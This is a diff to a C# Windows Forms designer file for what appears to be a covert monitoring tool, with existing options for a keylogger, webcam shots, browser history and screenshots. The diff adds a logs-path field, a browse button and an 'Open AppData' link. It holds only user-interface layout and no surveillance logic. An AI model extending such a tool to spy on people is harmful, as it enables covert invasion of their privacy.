@@ -34,6 +34,9 @@
             this.label1 = new System.Windows.Forms.Label();
             this.numericUpDown_screenShotInterval = new System.Windows.Forms.NumericUpDown();
             this.panelBody = new System.Windows.Forms.Panel();
+            this.button_Browse_logs_path = new System.Windows.Forms.Button();
+            this.textBox_logsPath = new System.Windows.Forms.TextBox();
+            this.label5 = new System.Windows.Forms.Label();
             this.buttonCancelUnistallation = new System.Windows.Forms.Button();
             this.buttonKill = new System.Windows.Forms.Button();
             this.panel_icon_Preview = new System.Windows.Forms.Panel();
@@ -47,6 +50,7 @@
             this.checkBoxCamShots = new System.Windows.Forms.CheckBox();
             this.checkBoxBrowserHistory = new System.Windows.Forms.CheckBox();
             this.checkBoxKeyLogger = new System.Windows.Forms.CheckBox();
+            this.linkLabel_app_data_dir = new System.Windows.Forms.LinkLabel();
             this.linkLabelOpenLogsFolder = new System.Windows.Forms.LinkLabel();
             this.label_minutes = new System.Windows.Forms.Label();
             this.pictureBox_Spy = new System.Windows.Forms.PictureBox();
@@ -104,6 +108,9 @@
             | System.Windows.Forms.AnchorStyles.Left) 
             | System.Windows.Forms.AnchorStyles.Right)));
             this.panelBody.BackColor = System.Drawing.Color.Transparent;
+            this.panelBody.Controls.Add(this.button_Browse_logs_path);
+            this.panelBody.Controls.Add(this.textBox_logsPath);
+            this.panelBody.Controls.Add(this.label5);
             this.panelBody.Controls.Add(this.buttonCancelUnistallation);
             this.panelBody.Controls.Add(this.buttonKill);
             this.panelBody.Controls.Add(this.panel_icon_Preview);
@@ -113,6 +120,7 @@
             this.panelBody.Controls.Add(this.textBox_Icon_path);
             this.panelBody.Controls.Add(this.label2);
             this.panelBody.Controls.Add(this.groupBox_Functions);
+            this.panelBody.Controls.Add(this.linkLabel_app_data_dir);
             this.panelBody.Controls.Add(this.linkLabelOpenLogsFolder);
             this.panelBody.Controls.Add(this.label_minutes);
             this.panelBody.Controls.Add(this.numericUpDown_screenShotInterval);
@@ -122,6 +130,34 @@
             this.panelBody.Size = new System.Drawing.Size(763, 222);
             this.panelBody.TabIndex = 2;
             this.panelBody.VisibleChanged += new System.EventHandler(this.panel1_VisibleChanged);
+            // 
+            // button_Browse_logs_path
+            // 
+            this.button_Browse_logs_path.Location = new System.Drawing.Point(720, 151);
+            this.button_Browse_logs_path.Name = "button_Browse_logs_path";
+            this.button_Browse_logs_path.Size = new System.Drawing.Size(35, 23);
+            this.button_Browse_logs_path.TabIndex = 15;
+            this.button_Browse_logs_path.Text = "...";
+            this.button_Browse_logs_path.UseVisualStyleBackColor = true;
+            this.button_Browse_logs_path.Click += new System.EventHandler(this.button_Browse_logs_path_Click);
+            // 
+            // textBox_logsPath
+            // 
+            this.textBox_logsPath.Location = new System.Drawing.Point(108, 154);
+            this.textBox_logsPath.Name = "textBox_logsPath";
+            this.textBox_logsPath.ReadOnly = true;
+            this.textBox_logsPath.Size = new System.Drawing.Size(605, 20);
+            this.textBox_logsPath.TabIndex = 14;
+            this.textBox_logsPath.TextChanged += new System.EventHandler(this.textBox1_TextChanged);
+            // 
+            // label5
+            // 
+            this.label5.AutoSize = true;
+            this.label5.Location = new System.Drawing.Point(12, 160);
+            this.label5.Name = "label5";
+            this.label5.Size = new System.Drawing.Size(55, 13);
+            this.label5.TabIndex = 13;
+            this.label5.Text = "Logs Path";
             // 
             // buttonCancelUnistallation
             // 
@@ -253,6 +289,17 @@
             this.checkBoxKeyLogger.Text = "KeyLogger";
             this.checkBoxKeyLogger.UseVisualStyleBackColor = true;
             this.checkBoxKeyLogger.CheckedChanged += new System.EventHandler(this.checkBoxKeyLogger_CheckedChanged);
+            // 
+            // linkLabel_app_data_dir
+            // 
+            this.linkLabel_app_data_dir.AutoSize = true;
+            this.linkLabel_app_data_dir.Location = new System.Drawing.Point(567, 195);
+            this.linkLabel_app_data_dir.Name = "linkLabel_app_data_dir";
+            this.linkLabel_app_data_dir.Size = new System.Drawing.Size(78, 13);
+            this.linkLabel_app_data_dir.TabIndex = 3;
+            this.linkLabel_app_data_dir.TabStop = true;
+            this.linkLabel_app_data_dir.Text = "Open AppData";
+            this.linkLabel_app_data_dir.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.linkLabel_app_data_dir_LinkClicked);
             // 
             // linkLabelOpenLogsFolder
             // 
@@ -423,6 +470,10 @@
         private System.Windows.Forms.PictureBox pictureBox_Spy;
         private System.Windows.Forms.Button buttonKill;
         private System.Windows.Forms.Button buttonCancelUnistallation;
+        private System.Windows.Forms.LinkLabel linkLabel_app_data_dir;
+        private System.Windows.Forms.Button button_Browse_logs_path;
+        private System.Windows.Forms.TextBox textBox_logsPath;
+        private System.Windows.Forms.Label label5;
 
     }
 }
